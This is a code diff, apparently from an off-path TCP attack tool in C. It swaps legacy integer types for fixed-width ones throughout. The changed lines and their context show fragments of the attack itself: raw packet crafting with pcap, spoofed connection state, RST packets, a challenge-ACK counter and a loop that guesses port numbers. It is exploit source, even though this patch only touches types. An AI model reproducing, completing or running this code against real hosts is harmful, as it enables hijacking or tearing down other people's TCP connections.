@@ -17,6 +17,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <stdint.h>
 
 /* internet networking */
 #include <sys/socket.h>
@@ -76,12 +77,12 @@ typedef struct packet_struct {
 
 typedef struct conn_struct {
 	cstate_t state;
-	u_short id;
+	uint16_t id;
 	struct sockaddr_in *src;
 	struct sockaddr_in *dst;
 	/* in host endian */
-	u_long seq;
-	u_long ack;
+	uint32_t seq;
+	uint32_t ack;
 } conn_t;
 
 typedef struct thctx_struct {
@@ -93,7 +94,7 @@ typedef struct thctx_struct {
 	packet_t *pkt;
 	int numpkts;
 	suseconds_t delay;
-	u_short winsz; // initial TCP window size
+	uint16_t winsz; // initial TCP window size
 } thctx_t;
 
 /* global count for challenge ACKs received in one period */
@@ -111,11 +112,11 @@ static volatile thctx_t g_ctx;
 /* prototypes.. */
 int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli);
 
-u_short in_cksum(u_short *addr, size_t len);
-void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq);
+uint16_t in_cksum(uint16_t *addr, size_t len);
+void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, uint32_t seq);
 int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags, char *data, size_t len);
 int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags, char *data, size_t len);
-int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
+int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, uint32_t *pack, uint32_t *pseq, void **pdata, size_t *plen
 #ifdef DEBUG_SEQ
 	, cstate_t conn_state
 #endif
@@ -126,7 +127,7 @@ void setterm(int mode);
 int kbhit(void);
 
 int lookup_host(char *hostname, struct sockaddr_in *addr);
-int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2ip);
+int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport, int *off2ip);
 
 
 /*
@@ -171,7 +172,7 @@ int main(int argc, char *argv[])
 		fprintf(stderr, "[!] %s is not a valid port.\n", argv[2]);
 		return 1;
 	}
-	srvaddr.sin_port = htons((u_short)srvport);
+	srvaddr.sin_port = htons((uint16_t)srvport);
 
 	/* look up this machine's address */
 	memset(&myaddr, 0, sizeof(myaddr));
@@ -228,7 +229,7 @@ int lookup_host(char *hostname, struct sockaddr_in *addr)
  *
  * on succes, we return 1, on failure, 0
  */
-int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2ip)
+int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport, int *off2ip)
 {
    struct bpf_program bpfp; /* needed to set the filter */
    char errorstr[PCAP_ERRBUF_SIZE], filterstr[80], *iface;
@@ -374,13 +375,13 @@ int conduct_offpath_attack(void)
 {
 	int chack_cnt[4] = { 0 };
 	int i, round = 0;
-	u_long old_seq;
+	uint32_t old_seq;
 	packet_t rst_pkt;
 	pthread_t sth, rth;
 	struct timeval start, now, diff;
 	astate_t attack_state = AS_SYNC;
 	volatile conn_t *legit, *spoof;
-	u_short guess_start = 0, guess_end = 0, guess_mid = 0;
+	uint16_t guess_start = 0, guess_end = 0, guess_mid = 0;
 
 	legit = &(g_ctx.conn_legit);
 	spoof = &(g_ctx.conn_spoof);
@@ -555,7 +556,7 @@ int conduct_offpath_attack(void)
 				/* only send this once. */
 				spoof->src->sin_port = 0;
 			} else {
-				u_short guess;
+				uint16_t guess;
 
 				guess_mid = ((uint32_t)guess_start + (uint32_t)guess_end) / 2;
 				for (guess = guess_mid; guess < guess_end; guess++) {
@@ -692,7 +693,7 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 		pcret = pcap_next_ex(pch, &pchdr, &inbuf);
 		if (pcret == 1) {
 			u_char flags;
-			u_long rack, rseq;
+			uint32_t rack, rseq;
 			void *data;
 			size_t datalen;
 
@@ -833,7 +834,7 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 /*
  * initialize a connection structure from the parameters
  */
-void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq)
+void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, uint32_t seq)
 {
 	pconn->id = (getpid() + 1337) & 0xffff;
 	pconn->state = CS_NEW;
@@ -848,12 +849,12 @@ void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_
  * ripped from ping.c, it calulates the checksum of len bytes at addr and
  * returns it.
  */
-u_short in_cksum(u_short *addr, size_t len)
+uint16_t in_cksum(uint16_t *addr, size_t len)
 {
 	register int nleft = len;
-	register u_short *w = addr;
+	register uint16_t *w = addr;
 	register int sum = 0;
-	u_short answer = 0;
+	uint16_t answer = 0;
 
 	while (nleft > 1) {
 		sum += *w++;
@@ -884,7 +885,7 @@ int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags
 	struct ip ip;
 	struct tcphdr tcp;
 	char tcpbuf[4096], *ptr;
-	u_short size;
+	uint16_t size;
 
 	/* buffer too small? */
 	if (*outlen < sizeof(ip) + sizeof(tcp) + len) {
@@ -907,7 +908,7 @@ int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags
 	ip.ip_dst.s_addr = pconn->dst->sin_addr.s_addr;
 
 	/* calculate the IP checksum */
-	ip.ip_sum = in_cksum((u_short *)&ip, sizeof(ip));
+	ip.ip_sum = in_cksum((uint16_t *)&ip, sizeof(ip));
 
 	/* construct the TCP header */
 	tcp.th_sport = pconn->src->sin_port;
@@ -933,7 +934,7 @@ int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags
 	memcpy(ptr, &tcp, sizeof(tcp));
 	ptr += sizeof(tcp);
 	memcpy(ptr, data, len);
-	tcp.th_sum = in_cksum((u_short *)tcpbuf, sizeof(tcp) + 12 + len);
+	tcp.th_sum = in_cksum((uint16_t *)tcpbuf, sizeof(tcp) + 12 + len);
 
 	/* build the final packet */
 	ptr = output;
@@ -972,7 +973,7 @@ int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags, char *data, size
 	printf("[*] %s : %d --> %d : %s : seq %lu, ack %lu (len %lu)\n",
 			g_conn_states[pconn->state],
 			ntohs(tcp.th_sport), ntohs(tcp.th_dport),
-			tcp_flags(tcp.th_flags), pconn->seq, pconn->ack, (u_long)len);
+			tcp_flags(tcp.th_flags), pconn->seq, pconn->ack, (uint32_t)len);
 #endif
 	return 1;
 }
@@ -982,7 +983,7 @@ int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags, char *data, size
  * process the packet captured by libpcap. if everything goes well, we return
  * the TCP flags, ack, seq, and data (w/len) to the caller.
  */
-int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
+int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, uint32_t *pack, uint32_t *pseq, void **pdata, size_t *plen
 #ifdef DEBUG_SEQ
 		, cstate_t conn_state
 #endif
@@ -1028,12 +1029,12 @@ int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, u_long *
 	datalen -= (iplen + tcplen);
 
 #ifdef DEBUG_SEQ
-	//printf("inbuf %p, ptcp %p, ptctp+1 %p, caplen %lu\n", inbuf, ptcp, ptcp+1, (u_long)pph->caplen);
+	//printf("inbuf %p, ptcp %p, ptctp+1 %p, caplen %lu\n", inbuf, ptcp, ptcp+1, (uint32_t)pph->caplen);
 	printf("[*] %s : %d <-- %d : %s : seq %lu, ack %lu (len: %lu)\n",
 			g_conn_states[conn_state],
 			ntohs(ptcp->th_dport), ntohs(ptcp->th_sport),
 			tcp_flags(ptcp->th_flags),
-			(u_long)ntohl((u_long)ptcp->th_seq), (u_long)ntohl((u_long)ptcp->th_ack), datalen);
+			(uint32_t)ntohl((uint32_t)ptcp->th_seq), (uint32_t)ntohl((uint32_t)ptcp->th_ack), datalen);
 #endif
 
 
@@ -1041,9 +1042,9 @@ int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, u_long *
 	if (flags)
 		*flags = ptcp->th_flags;
 	if (pack)
-		*pack = ntohl((u_long)ptcp->th_ack);
+		*pack = ntohl((uint32_t)ptcp->th_ack);
 	if (pseq)
-		*pseq = ntohl((u_long)ptcp->th_seq);
+		*pseq = ntohl((uint32_t)ptcp->th_seq);
 	if (pdata) {
 		if (datalen > 0)
 			*pdata = ptr;
